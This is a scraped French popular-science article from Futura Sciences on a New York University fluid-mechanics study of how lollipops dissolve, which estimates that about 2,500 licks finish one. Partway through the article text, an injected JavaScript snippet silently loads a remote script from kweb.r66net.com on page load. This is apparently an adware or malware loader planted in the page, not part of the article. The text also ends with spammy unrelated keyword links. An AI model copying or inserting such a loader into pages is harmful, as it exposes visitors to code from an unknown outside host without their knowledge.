{"title": "Science decalee : il faut 2.500 coups de langue pour finir une sucette", "newspaper": "Futura Sciences", "author": ["Marie-Celine Jacquier"], "date_publi": "2017-07-15", "content": "Des chercheurs de l'universite de New York ont place des bonbons de tailles et de formes differentes dans de l'eau en mouvement. Ces travaux leur ont permis de calculer la vitesse a laquelle se dissout une sucrerie. Si beaucoup d'enfants ont essaye de terminer une sucette sans la croquer, peu ont reussi... Il faut la lecher. Mais combien de coups de  langue  sont necessaires pour reussir cet exploit ? On en sait un peu plus aujourd'hui grace a une equipe de chercheurs de l'universite de New York qui, avec beaucoup de serieux, a etudie l'evolution de la forme de sucreries dans de l'eau en  mouvement . Une recherche inutile ? Pas si sur. Leurs resultats qui paraissent dans la revue  Journal of Fluid Mechanics  pourraient avoir de nombreuses  applications . Et pas seulement pour l'industrie de la confiserie.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  La sucette s'aplatit d'un cote et se bombe de l'autre Pour leurs experiences, les scientifiques ont place des sucettes mesurant de 1 a 10 cm dans de l'eau qui coulait a une  vitesse  de 0,1 a 1 m/s. Ils ont utilise differentes formes de sucreries (spheriques et cylindriques) et les ont photographiees pendant qu'elles se dissolvaient. Ils ont observe grace a ces images que la  turbulence  creee dans le  courant  d'eau a conduit a un  aplatissement  de l'arriere de la sucrerie. Chaque sucette developpait la meme forme avec un arriere plat et un avant bombe. Comme l'explique Leif Ristroph, un mathematicien qui a mene cette etude, les sucettes ont tendance a evoluer vers des formes similaires :  << Nous trouvons que des formes geometriques initiales differentes sont sculptees en une forme terminale similaire avant de finalement disparaitre >>. Terminer une sucette sans la croquer peut prendre beaucoup de temps. (c) Beth, flickr, cc by 2.0                               Un calcul qui interesse l'industrie et la geologie En plus de l'evolution de la forme de la sucrerie, les chercheurs se sont interesses a la vitesse a laquelle celle-ci disparaissait. Mathematiquement parlant, la vitesse de dissolution de la sucette augmente avec la racine carree de la vitesse du fluide. Entre autres applications de leurs calculs, les chercheurs ont estime qu'il fallait qu'une langue leche 1.000 fois le  bonbon  pour dissoudre 1 cm de  sucrerie . Donc, pour une sucette classique de 2,5 cm de diametre, 2.500 coups de langue devraient permettre d'en venir a bout... Ceci ne tient pas compte de l'action de la langue qui pourrait modifier la facon dont le bonbon se dissout, mais une  modelisation  plus proche de la realite qu'un ecoulement d'eau est plus difficile a obtenir. Ces resultats peuvent faire sourire. Cependant, ils pourraient permettre des applications sur la dissolution de materiaux pour les industries chimiques et pharmaceutiques. Ils peuvent aussi aider a mieux comprendre le processus d' erosion  des  roches  par l'eau de la  mer  ou des rivieres. L'etude sera-t-elle en lice pour les  prix IgNobel  2015, remis par l'association  Improbable Research , dont la devise est, justement :  << la science qui fait sourire puis reflechir >>  ? Vous avez aime cet article ? N'hesitez pas a le partager avec vos ami(e)s et aidez-nous a faire connaitre Futura :) ! La Redaction vous remercie. Facebook Twitter Google+ Linkedin Pinterest A voir aussi :  logiciel pour changer langue de windows xp  |  commande decalee  |  dut rentree decalee  |  rentree decalee  |  couper gateau en en coups  |  langue des sms", "theme": "sciences"}